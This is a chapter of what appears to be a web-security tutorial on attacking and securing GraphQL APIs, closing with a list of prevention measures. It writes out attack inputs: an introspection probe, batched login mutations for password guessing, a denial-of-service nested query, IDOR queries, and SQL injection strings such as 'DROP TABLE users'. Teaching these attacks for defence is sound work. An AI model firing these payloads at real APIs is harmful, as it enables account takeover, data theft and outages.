# GraphQL Security

GraphQL APIs present unique attack surfaces compared to REST, including introspection, batching attacks, and complex query relationships.

## Introspection

GraphQL introspection exposes the entire schema, including types, queries, mutations, and subscriptions.

```graphql
# Introspection query
query {
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

```bash
# Check if introspection is enabled
curl -X POST https://target.com/graphql -H "Content-Type: application/json" -d '{"query":"{__schema{types{name}}}"}'
```

### Tools
- **GraphQL Voyager** — Visualize schema
- **GraphiQL** — Interactive IDE
- **InQL** — Burp Suite extension

## Batching Attacks

GraphQL allows sending multiple queries in one request, bypassing per-request rate limits.

```graphql
query {
  user1: user(id: 1) { email }
  user2: user(id: 2) { email }
  # ... 1000 more
  user1000: user(id: 1000) { email }
}
```

### Batching for Password Guessing
```graphql
mutation {
  a: login(email: "admin@target.com", password: "password1") { success }
  b: login(email: "admin@target.com", password: "password2") { success }
  c: login(email: "admin@target.com", password: "password3") { success }
}
```

## Deep Query Exploitation

Nested relationships can create expensive queries that cause DoS.

```graphql
query {
  users {
    posts {
      comments {
        author {
          posts {
            comments {
              author {
                posts {
                  title
                }
              }
            }
          }
        }
      }
    }
  }
}
```

## Authorization Issues

### Missing Field-Level Authorization
```graphql
query {
  user(id: 1) {
    username    # Public
    email       # Should be private
    ssn         # Should be very private
  }
}
```

### IDOR in GraphQL

```graphql
query {
  user(id: 2) {    # Change to any ID
    username
    privateEmail
  }
}
```

## GraphQL Injection

### Argument Injection
```graphql
query {
  user(id: "1; DROP TABLE users") {
    username
  }
}
```

### SQL/NoSQL Injection via GraphQL
```graphql
query {
  search(query: "admin' OR '1'='1") {
    results
  }
}
```

## Tools

| Tool | Purpose |
|------|---------|
| **graphw00f** | GraphQL fingerprinting |
| **InQL** | Burp extension for GraphQL security |
| **GraphQLmap** | GraphQL exploitation script |
| **Clairvoyance** | GraphQL introspection brute-force |
| **GraphQL Cop** | Security audit utility |

## Prevention

1. **Disable introspection in production**
2. **Query depth limiting** — Prevent deep nested queries
3. **Query cost analysis** — Limit expensive queries
4. **Rate limiting** — Per-user, per-IP, not per-query
5. **Field-level authorization** — Check permissions per field
6. **Batch limiting** — Limit concurrent queries in a batch
7. **Persisted queries** — Allow only pre-approved queries

---

> **Next**: [JWT Attacks](05-jwt-attacks.md)
